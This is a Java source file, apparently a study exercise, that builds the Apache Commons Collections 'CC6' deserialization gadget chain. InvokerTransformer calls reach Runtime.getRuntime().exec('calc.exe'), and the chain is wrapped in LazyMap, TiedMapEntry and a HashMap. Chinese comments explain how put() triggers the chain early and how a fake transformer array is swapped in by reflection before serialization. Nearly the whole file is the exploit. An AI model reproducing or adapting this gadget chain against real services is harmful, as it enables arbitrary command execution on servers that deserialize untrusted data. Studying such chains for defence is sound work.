package CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class EazyCC0 {

    public static void main(String[] args) throws IOException {

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),

                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),

                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] { "calc.exe" }),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(outerMap, "oo");

        HashMap expMap = new HashMap();
        expMap.put(entry, "uu");   // entry作为key传入
        // put也调用了hash() 触发了后边一系列

        // 所以先传一个fakeTransformers  后边在要进入序列化通过反射 传入真正的transformers

//            ByteArrayOutputStream barr = new ByteArrayOutputStream();
//            ObjectOutputStream oos = new ObjectOutputStream(barr);
//            oos.writeObject(expMap);
//            oos.close();


    }
}
